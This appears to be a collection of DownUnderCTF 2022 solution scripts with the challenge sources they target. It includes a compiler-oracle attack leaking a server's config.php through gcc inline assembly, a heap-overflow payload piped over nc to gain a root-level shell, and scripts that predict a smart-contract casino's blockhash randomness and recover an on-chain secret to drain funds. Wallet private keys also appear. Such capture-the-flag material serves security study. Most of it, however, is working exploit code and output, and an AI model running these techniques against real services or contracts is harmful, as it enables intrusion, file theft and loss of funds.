88
89
90
91
92
93
94
95
96
97
98
99
100
101
import subprocess
import requests

# based on https://rpis.ec/blog/hxp-26c3-ctf-compilerbot/

payload = r"""
__asm__ (
 // create a section of N bytes
 ".pushsection .foo\n"
 ".rept __GUESS__\n"
 ".byte 0xFF\n"
 ".endr\n"
 ".popsection\n"

 // create a relocation that tries to modify our section at some offset
 // based on a single byte of the flag; if it is out of bounds then the
 // linker will error
 ".pushsection .rela.foo\n"
 ".align 1\n"

 // offset into .foo -- must not overflow !
 ".incbin \"config.php\", __OFFSET__, 1\n"
 ".rept 7\n"
 ".byte 0\n"
 ".endr\n"

 ".quad 0x000000000000000E\n" // type of reloc: R_X86_64_8
 ".quad 0x0000000000000001\n" // value to add at that offset
 ".popsection\n"
);
"""

def try_compile(code):
 code = "int main() { " + code + " }"
 sub = subprocess.Popen(
 ["gcc", "-Werror", "-x", "c", "-o", "/dev/null", "-"],
 stdin=subprocess.PIPE,
 stdout=subprocess.PIPE,
 stderr=subprocess.STDOUT,
 )
 stdout, _ = sub.communicate(code.encode())
 return sub.returncode == 0 and stdout.strip() == b""

def try_compile(code):
 code = "int main() { " + code + " }"
 code += """
void dummy(){
 for(int i=0;i<100;i++){}
}
struct LOL{};
"""
 # r = requests.post("http://localhost:
8000/", data={"code": code}).text
 r = requests.post(
 "https://misc-i-c-u-php-16347326eb82.2022.ductf.dev", data={"code": code}
 ).text
 suc = "You passed!" in r
 return suc

# test first
code = payload
code = code.replace(r'".incbin \"config.php\", __OFFSET__, 1\n"', r'".byte 0x20\n"')
code = code.replace("__GUESS__", "128")
assert try_compile(code)

# linear search
# flag = ""
# starti = 1100
# for flag_offset in range(starti, starti + 10):
# for guess in range(0x20, 0x7F):
# code = payload
# code = code.replace("__GUESS__", str(guess))
# code = code.replace("__OFFSET__", str(flag_offset))
# if try_compile(code):
# flag += chr(guess - 1)
# print(flag)
# break
# else:
# # no guess worked, maybe end of the flag
# break

# binary search
flag = ""
starti = 1100
for flag_offset in range(starti, starti + 100):
 l = 0x20
 r = 0x7F
 while l + 1 < r:
 m = (l + r) // 2
 code = payload
 code = code.replace("__GUESS__", str(m))
 code = code.replace("__OFFSET__", str(flag_offset))
 if try_compile(code):
 r = m
 else:
 l = m
 flag += chr(l)
 print(flag)
# DUCTF{pr3pr0c3ssOrPoWer3dPHPpEEk1ngPuzZLe_2b842b}
1
2
3
4
5
6
7
8
9
%:
line 59 "/var/www/html/config.php"
fo;
struct xb{
int b;
};

int main(){
for(;;){}
}
1
2
3
4
5
# fmt: off
ar = [0xc4, 0xda, 0xc5, 0xdb, 0xce, 0x80, 0xf8, 0x3e, 0x82, 0xe8, 0xf7, 0x82, 0xef, 0xc0, 0xf3, 0x86, 0x89, 0xf0, 0xc7, 0xf9, 0xf7, 0x92, 0xca, 0x8c, 0xfb, 0xfc, 0xff, 0x89, 0xff, 0x93, 0xd1, 0xd7, 0x84, 0x80, 0x87, 0x9a, 0x9b, 0xd8, 0x97, 0x89, 0x94, 0xa6, 0x89, 0x9d, 0xdd, 0x94, 0x9a, 0xa7, 0xf3, 0xb2]
# fmt: on
print(bytes([(x ^ 0x42) - 0x42 - i for i, x in enumerate(ar)]))
# DUCTF{r3v_is_3asy_1f_y0u_can_r34d_ass3mbly_r1ght?}
1
2
3
4
5
6
7
8
9
10
11
12
13
from base64 import b64decode as g

f = bytes.fromhex
flag = b""
flag += g(g("UkZWRFZFWT0="))
flag += g(g("ZXc9PQ=="))
flag += g(g(f("576B64736131677A62485A6B55543039")))
flag += g(g(f("57444E57656C70574F44303D")))
flag += g(g(f("57565935565646575453383D")))
flag += b"_ZGVhZGIzM2ZjYWZl"
flag += g(g("ZlE9PQ=="))
print(flag)
# DUCTF{did_you_use_a_TAS?_ZGVhZGIzM2ZjYWZl}
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
function search(ar, target, path = []) {
	let res = null
	ar.forEach((x, i) => {
 if (x === target) res = path.concat([i])
 if (Array.isArray(x)) {
 const t = search(x, target, path.concat([i]))
 if (t) res = t
 }
	})
	return res
}
function expand(s) {
	let res = ''
	for (const x of s) {
 if (x === '0') res += 0
 else res += '1'.repeat(Number(x)) + '0'
	}
	return res
}
key = ''
for (let i = 1; i <= 1337; i++) key += expand(search(LOCK, i))
K = await sha512(key)
dec = []
for (var i = 0; i < 64; i++) dec.push(String.fromCodePoint(C[i] ^ K[i]))
console.log(dec.join(''))
// DUCTF{s3arch1ng_thr0ugh_an_arr4y_1s_n0t_th4t_h4rd_ab894d8dfea17}
1
2
3
4
5
6
7
8
9
#!/usr/bin/env python3

from ctypes import CDLL, c_buffer
libc = CDLL('/lib/x86_64-linux-gnu/libc.so.6')
buf1 = c_buffer(512)
buf2 = c_buffer(512)
libc.gets(buf1)
if b'DUCTF' in bytes(buf2):
 print(open('./flag.txt', 'r').read())
1
2
3
4
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaDUCTF

DUCTF{C_is_n0t_s0_f0r31gn_f0r_incr3d1bl3_pwn3rs}
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
    #include <stdio.h>
    #include 
    #include <string.h>
    #include <stdlib.h>

    #define NUM_USERS 0x8
    #define USERNAME_LEN 0x18
    #define ADMIN_UID 0x1337

typedef struct {
 int uid;
 char username[USERNAME_LEN];
} *user_t;

int curr_user_id = ADMIN_UID;
user_t users[NUM_USERS];

void init() {
 setvbuf(stdout, 0, 2, 0);
 setvbuf(stdin, 0, 2, 0);
}

void read_n_delimited(char* buf, size_t n, char delimiter) {
 char c;
 size_t i = 0;
 while(i <= n - 1) {
 if(read(0, &c, 1) != 1) {
 break;
 }

 if(c == delimiter) {
 break;
 }

 buf[i++] = c;
 }
 buf[i] = '\0';
}

int read_int() {
 char buf[8];
 read_n_delimited(buf, 8, '\n');
 return atoi(buf);
}

void menu() {
 puts("1. Add user");
 puts("2. Login");
 printf("> ");
}

void add_user() {
 user_t user = (user_t) malloc(sizeof(user_t));
 users[curr_user_id++ - ADMIN_UID] = user;

 printf("Username length: ");
 size_t len = read_int();
 if(len > USERNAME_LEN) {
 puts("Length too large!");
 exit(1);
 }

 if(!user->uid) {
 user->uid = curr_user_id;
 }
 printf("Username: ");
 printf("a = %p\n", *(long*)(user->username + 0x8));
 printf("a = %p\n", *(long*)(user->username + 0x10));
 printf("a = %p\n", *(long*)(user->username + 0x18));
 read_n_delimited(user->username, len, '\n');
 printf("b = %p\n", *(long*)(user->username + 0x8));
 printf("b = %p\n", *(long*)(user->username + 0x10));
 printf("b = %p\n", *(long*)(user->username + 0x18));
 printf("ptr = %p\n", user->username + 0x10);
 printf("user = %p\n", user);
}

void login() {
 int found = 0;

 char username[USERNAME_LEN];
 printf("Username: ");
 read_n_delimited(username, USERNAME_LEN, '\n');
 for(int i = 0; i < NUM_USERS; i++) {
 if(users[i] != NULL) {
 if(strncmp(users[i]->username, username, USERNAME_LEN) == 0) {
 found = 1;

 if(users[i]->uid == 0x1337) {
 system("/bin/sh");
 } else {
 printf("Successfully logged in! uid: 0x%x\n", users[i]->uid);
 }
 }
 }
 }

 if(!found) {
 puts("User not found");
 }
}

int main() {
 init();

 while(1) {
 menu();
 int choice = read_int();
 if(choice == 1) {
 add_user();
 } else if(choice == 2) {
 login();
 } else {
 exit(1);
 }
 }
}
1
2
3
if(!user->uid) {
 user->uid = curr_user_id;
}
1
2
(printf '1\n0\nxxxxaaaabbbb\0\0\0\0\0\0\0\0\x51\x0d\x02\0\0\0\0\0\x37\x13\n1\n0\npeko\n2\npeko\n'; cat) | nc 2022.ductf.dev 30025
# DUCTF{th3_4uth_1s_s0_bad_1t_d0esnt_ev3n_us3_p4ssw0rds}
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

/**
 * @title SolveMe
 * @author BlueAlder duc.tf
 */
contract SolveMe {
 bool public isSolved = false;

 function solveChallenge() external {
 isSolved = true;
 }

}
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
const Web3 = require('web3')
const web3 = new Web3('https://blockchain-solveme-4dc7ba0b99f5ae1b-eth.2022.ductf.dev/')
const fs = require('fs/promises')
;(async () => {
	// yarn solcjs SolveMe.sol --abi
	const abi = JSON.parse(await fs.readFile('./SolveMe_sol_SolveMe.abi', 'utf-8'))
	const contract = new web3.eth.Contract(abi, '0x6E4198C61C75D1B4D1cbcd00707aAC7d76867cF8')
	const acc = web3.eth.accounts.wallet.add('0x1962c6f902d12fd2b27d71767b0bd7269d3ec58300aaa5baa3db778edb0e361b')
	console.log(acc)
	const gas = await contract.methods.solveChallenge().estimateGas({
 from: acc.address
	})
 console.log(gas)
	contract.methods
 .solveChallenge()
 .send({
 from: acc.address,
 gas
 })
 .on('receipt', function (receipt) {
 console.log('success')
 console.log(receipt)
 })
 .on('error', function (error, receipt) {
 console.log('error')
 console.log(error)
 console.log(receipt)
 })
})()
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

/**
 * @title Secret And Ephemeral
 * @author Blue Alder (https://duc.tf)
 **/

contract SecretAndEphemeral {
 address private owner;
 int256 public seconds_in_a_year = 60 * 60 * 24 * 365;
 string word_describing_ductf = "epic";
 string private not_yours;
 mapping(address => uint) public cool_wallet_addresses;

 bytes32 public spooky_hash; //

 constructor(string memory _not_yours, uint256 _secret_number) {
 not_yours = _not_yours;
 spooky_hash = keccak256(abi.encodePacked(not_yours, _secret_number, msg.sender));
 }

 function giveTheFunds() payable public {
 require(msg.value > 0.1 ether);
 // Thankyou for your donation
 cool_wallet_addresses[msg.sender] += msg.value;
 }

 function retrieveTheFunds(string memory secret, uint256 secret_number, address _owner_address) public {
 bytes32 userHash = keccak256(abi.encodePacked(secret, secret_number, _owner_address));

 require(userHash == spooky_hash, "Somethings wrong :(");

 // User authenticated, sending funds
 uint256 balance = address(this).balance;
 payable(msg.sender).transfer(balance);
 }
}
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
const Web3 = require('web3')
const web3 = new Web3('https://blockchain-secretandephemeral-6afda207eb1b22a1-eth.2022.ductf.dev/')
const eth = web3.eth
const playerAddr = '0xD8dD4B9Ae58E0E314E6F500A760be562B446BFbC'
const contactAddr = '0x6E4198C61C75D1B4D1cbcd00707aAC7d76867cF8'
;(async () => {
	for (let i = 0; i < 609; i++) {
 const block = await web3.eth.getBlock(i)
 if (block.transactions.length > 0) {
 console.log(i)
 console.log(block.transactions)
 for (const txn of block.transactions) {
 const tx = await web3.eth.getTransaction(txn)
 console.log(tx)
 }
 }
	}
})()
// and one of the transactions is
// {
// blockHash: '0xc4873a1786b507b4375886ec5e782f8fdbcbbc0c95deaf035a9f81422937569e',
// blockNumber: 4,
// from: '0x7BCF8A237e5d8900445C148FC2b119670807575b',
// gas: 391467,
// gasPrice: '1000000000',
// hash: '0xd3383dd590ea361847180c3616faed3a091c3e8f3296771e0c2844b2746d408f',
// input: '0x6301e1338060015560c060405260046080908152636570696360e01b60a05260029061002b908261013c565b5034801561003857600080fd5b506040516106fd3803806106fd833981016040819052610057916101fb565b6003610063838261013c565b506003813360405160200161007a939291906102ca565b60405160208183030381529060405280519060200120600581905550505061035a565b634e487b7160e01b600052604160045260246000fd5b600181811c908216806100c757607f821691505b6020821081036100e757634e487b7160e01b600052602260045260246000fd5b50919050565b601f82111561013757600081815260208120601f850160051c810160208610156101145750805b601f850160051c820191505b8181101561013357828155600101610120565b5050505b505050565b81516001600160401b038111156101555761015561009d565b6101698161016384546100b3565b846100ed565b602080601f83116001811461019e57600084156101865750858301515b600019600386901b1c1916600185901b178555610133565b600085815260208120601f198616915b828110156101cd578886015182559484019460019091019084016101ae565b50858210156101eb5787850151600019600388901b60f8161c191681555b5050505050600190811b01905550565b6000806040838503121561020e57600080fd5b82516001600160401b038082111561022557600080fd5b818501915085601f83011261023957600080fd5b81518181111561024b5761024b61009d565b604051601f8201601f19908116603f011681019083821181831017156102735761027361009d565b8160405282815260209350888484870101111561028f57600080fd5b600091505b828210156102b15784820184015181830185015290830190610294565b6000928101840192909252509401519395939450505050565b60008085546102d8816100b3565b600182811680156102f0576001811461030557610334565b60ff1984168752821515830287019450610334565b8960005260208060002060005b8581101561032b5781548a820152908401908201610312565b50505082870194505b50505094815260609390931b6001600160601b0319166020840152505060340192915050565b610394806103696000396000f3fe60806040526004361061004a5760003560e01c80631ac749ff1461004f57806323cfb56f146100775780637c46a9b014610081578063eb087bfb146100ae578063ecd424df146100c4575b600080fd5b34801561005b57600080fd5b5061006560015481565b60405190815260200160405180910390f35b61007f6100e4565b005b34801561008d57600080fd5b5061006561009c3660046101eb565b60046020526000908152604090205481565b3480156100ba57600080fd5b5061006560055481565b3480156100d057600080fd5b5061007f6100df366004610223565b61011e565b67016345785d8a000034116100f857600080fd5b33600090815260046020526040812080543492906101179084906102ee565b9091555050565b600083838360405160200161013593929190610315565b60405160208183030381529060405280519060200120905060055481146101985760405162461bcd60e51b81526020600482015260136024820152720a6dedacae8d0d2dccee640eee4dedcce40745606b1b604482015260640160405180910390fd5b6040514790339082156108fc029083906000818181858888f193505050501580156101c7573d6000803e3d6000fd5b505050505050565b80356001600160a01b03811681146101e657600080fd5b919050565b6000602082840312156101fd57600080fd5b610206826101cf565b9392505050565b634e487b7160e01b600052604160045260246000fd5b60008060006060848603121561023857600080fd5b833567ffffffffffffffff8082111561025057600080fd5b818601915086601f83011261026457600080fd5b8135818111156102765761027661020d565b604051601f8201601f19908116603f0116810190838211818310171561029e5761029e61020d565b816040528281528960208487010111156102b757600080fd5b826020860160208301376000602084830101528097505050505050602084013591506102e5604085016101cf565b90509250925092565b8082018082111561030f57634e487b7160e01b600052601160045260246000fd5b92915050565b6000845160005b81811015610336576020818801810151858301520161031c565b50919091019283525060601b6bffffffffffffffffffffffff1916602082015260340191905056fea2646970667358221220c558120b35ab560caa833f878d167e3c94af9005d6dea322262181580b0f895864736f6c634300081100330000000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000dec0ded0000000000000000000000000000000000000000000000000000000000000022736f20616e79776179732069206a757374207374617274656420626c617374696e67000000000000000000000000000000000000000000000000000000000000',
// nonce: 1,
// to: null,
// transactionIndex: 1,
// value: '0',
// type: 0,
// chainId: '0x7a69',
// v: '0xf4f6',
// r: '0xcf50c8e0ed100baae3b31d69e45e7498caec66478e5ed9d884c3cedec6a14f82',
// s: '0x73ebe87f3541c26669adf9ef18e665f47f1a30796f8f4b7162795099807f7e5a'
// }
// and by comparing input data and another contract deployed on Ropsten network we can see that the data passed into constructor is on chain
// the `_not_yours` seems to be `736f20616e79776179732069206a757374207374617274656420626c617374696e67`, which is `so anyways i just started blasting`
// and `_secret_number` is `dec0ded`, so it is 233573869
// the owner address is 0x7BCF8A237e5d8900445C148FC2b119670807575b
// calls `retrieveTheFunds` with these parameters to solve the challenge
// DUCTF{u_r_a_web3_t1me_7raveler_:)}
1
2
3
4
5
6
7
8
9
10
11
12
13
//SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.0;

import "OpenZeppelin/openzeppelin-contracts@4.3.2/contracts/token/ERC20/ERC20.sol";
import "OpenZeppelin/openzeppelin-contracts@4.3.2/contracts/access/Ownable.sol";

contract DUCoin is ERC20, Ownable {
 constructor() ERC20("DUCoin", "DUC") {}

 function freeMoney(address addr) external onlyOwner {
 _mint(addr, 1337);
 }
}
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
//SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.0;

import "./DUCoin.sol";
import "OpenZeppelin/openzeppelin-contracts@4.3.2/contracts/access/Ownable.sol";

contract Casino is Ownable {
 DUCoin public immutable ducoin;

 bool trialed = false;
 uint256 lastPlayed = 0;
 mapping(address => uint256) public balances;

 constructor(address token) {
 ducoin = DUCoin(token);
 }

 function deposit(uint256 amount) external {
 ducoin.transferFrom(msg.sender, address(this), amount);
 balances[msg.sender] += amount;
 }

 function withdraw(uint256 amount) external {
 require(balances[msg.sender] >= amount, "Insufficient balance!");
 ducoin.transfer(msg.sender, amount);
 balances[msg.sender] -= amount;
 }

 function _randomNumber() internal view returns(uint8) {
 uint256 ab = uint256(blockhash(block.number - 1));
 uint256 a = ab & 0xffffffff;
 uint256 b = (ab >> 32) & 0xffffffff;
 uint256 x = uint256(blockhash(block.number));
 return uint8((a * x + b) % 6);
 }

 function play(uint256 bet) external {
 require(balances[msg.sender] >= bet, "Insufficient balance!");
 require(block.number > lastPlayed, "Too fast!");
 lastPlayed = block.number;

 uint8 roll = _randomNumber();
 if(roll == 0) {
 balances[msg.sender] += bet;
 } else {
 balances[msg.sender] -= bet;
 }
 }

 function getTrialCoins() external {
 if(!trialed) {
 trialed = true;
 ducoin.transfer(msg.sender, 7);
 }
 }
}
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
const Web3 = require('web3')
const web3 = new Web3('https://blockchain-cryptocasino-4addd2f7a74c6ceb-eth.2022.ductf.dev/')
const fs = require('fs/promises')
const ducoinAddr = '0x6E4198C61C75D1B4D1cbcd00707aAC7d76867cF8'
const casinoAddr = '0x6189762f79de311B49a7100e373bAA97dc3F4bd0'
const myPriv = '0xc9fca06c1a90d7f3aafb7723fce52431e50fa1ed17355296011d23479b2aab11'

;(async () => {
	// yarn solcjs Casino.sol --abi
	const ducoinAbi = JSON.parse(await fs.readFile('./DUCoin_sol_DUCoin.abi', 'utf-8'))
	const ducoin = new web3.eth.Contract(ducoinAbi, ducoinAddr)
	const casinoAbi = JSON.parse(await fs.readFile('./Casino_sol_Casino.abi', 'utf-8'))
	const casino = new web3.eth.Contract(casinoAbi, casinoAddr)
	const acc = web3.eth.accounts.wallet.add(myPriv)

	for (let i = 0; i < 32; i++) {
 console.log('='.repeat(40))
 console.log('Round', i)
 console.log('='.repeat(40))
 // use approve (or any other transcation?) the make the block number change
 // because I am the only user of that network
 const approve = ducoin.methods.approve(casinoAddr, 7)
 await approve
 .send({
 from: acc.address,
 gas: await approve.estimateGas({
 from: acc.address
 })
 })
 .on('receipt', receipt => {
 console.log('approve success')
 })
 .on('error', (error, receipt) => {
 console.log('approve error')
 })

 // https://blog.positive.com/predicting-random-numbers-in-ethereum-smart-contracts-e5358c6b8620
 // blockhash(block.number - 1) is the hash of the previous block (the latest block before transaction)
 // blockhash(block.number) is always zero because it hasn't been computed
 const last = await web3.eth.getBlockNumber()
 console.log('last block num', last)
 const blk = await web3.eth.getBlock(last)
 const ab = BigInt(blk.hash)
 console.log('ab', ab)
 const roll = ((ab >> 32n) & 0xffffffffn) % 6n
 console.log('roll', roll)
 const bal = await casino.methods.balances(acc.address).call({ from: acc.address })
 console.log('bal', bal)
 const call = casino.methods.play(bal)
 const gas = await call.estimateGas({
 from: acc.address
 })
 if (roll === 0n) {
 await call
 .send({
 from: acc.address,
 gas
 })
 .on('receipt', receipt => {
 console.log('play success')
 })
 .on('error', (error, receipt) => {
 console.log('play error')
 })
 console.log('new bal', await casino.methods.balances(acc.address).call({ from: acc.address }))
 }
	}
})()
// DUCTF{sh0uldv3_us3d_a_vrf??}
```
